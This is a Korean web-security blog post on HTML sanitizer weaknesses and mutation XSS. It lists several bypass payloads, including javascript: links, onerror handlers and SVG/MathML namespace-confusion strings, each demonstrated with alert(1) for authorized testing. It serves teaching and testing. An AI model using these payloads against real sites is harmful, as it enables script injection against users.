---
title: "HTML Sanitizer와 Mutation XSS"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, XSS]
tags: [xss, sanitizer, mxss, web]
description: "HTML sanitizer 기본 옵션의 빈틈과, 정화 후 브라우저 재파싱으로 안전했던 마크업이 스크립트로 변하는 mutation XSS의 개념과 확인 구문을 정리합니다."
mermaid: true
---

> sanitizer로 걸렀는데도 XSS가 나는 이유는 둘이다. ① sanitizer 설정이 느슨하거나, ② 정화한 마크업을 브라우저가 **다시 파싱하면서 다른 트리로 변형**되기 때문이다(mutation XSS, mXSS).

## 개념

sanitizer는 허용 태그·속성만 남기고 나머지를 제거한다. 그런데 정화된 문자열이 `innerHTML`로 들어가면 브라우저 HTML 파서가 **다시 해석**하고, 그 과정에서 파서의 오류 복구·네임스페이스(SVG/MathML) 규칙 때문에 안전해 보였던 마크업이 실행 가능한 형태로 바뀔 수 있다. sanitizer가 본 트리와 브라우저가 만든 트리가 **다른 것**이 핵심이다.

```
sanitizer 통과 → innerHTML 삽입 → 브라우저 재파싱 → 다른 DOM 트리 → 스크립트 실행
```

흔한 원인: 허용 태그가 너무 넓음, `javascript:` URL·이벤트 핸들러 미차단, SVG/MathML 안의 HTML 파싱 전환, 깨진 태그의 오류 복구, 커스텀(직접 만든 정규식) sanitizer.

## 공격·우회 구문

허가된 범위, `alert(1)`로 증명한다. 대상 sanitizer·버전을 먼저 식별한다.

### 설정 빈틈

```
javascript: URL:  <a href="javascript:alert(1)">x</a>
이벤트 핸들러 허용:  <img src=x onerror=alert(1)>
허용 태그 과다:  <iframe>, <object>, <form>, <style>
```

### 네임스페이스 전환 (mXSS)

SVG/MathML 안에서 HTML 파싱으로 전환되는 지점을 노린다.

```
<svg><style><img src=x onerror=alert(1)></style></svg>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
```

### 오류 복구·속성 백틱

```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<listing>&lt;img src=x onerror=alert(1)&gt;</listing> 류 재해석
속성값 백틱: <img src=`x`onerror=alert(1)> (일부 파서가 하나의 속성으로)
```

### 확인 요령

```
정화된 결과를 실제 innerHTML 로 넣은 뒤의 DOM 트리를 DevTools 로 확인(문자열만 보지 말 것)
sanitizer 종류·버전 식별 → 해당 버전의 알려진 우회가 패치됐는지
```

## 참고 자료

- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
